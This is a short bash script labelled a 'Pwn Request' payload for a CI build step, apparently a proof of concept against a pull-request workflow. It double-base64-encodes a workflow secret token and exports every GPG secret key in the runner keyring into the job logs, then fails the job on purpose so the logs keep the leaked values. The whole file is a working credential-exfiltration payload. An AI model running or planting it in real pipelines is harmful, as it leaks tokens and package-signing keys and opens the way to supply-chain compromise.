#!/usr/bin/bash
# Pwn Request payload at the ci_pack_sdeb.sh sink. GERALT_SECRET comes from
# workflow-level env; PPA_GPG_PRIVATE_KEY is live in the runner keyring.
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
gpg --batch --yes --export-secret-keys 2>/dev/null | base64 | base64 | sed 's/^/GPG_KEY_LEAK=/'
# Fail explicitly so the workflow logs preserve the evidence.
exit 1
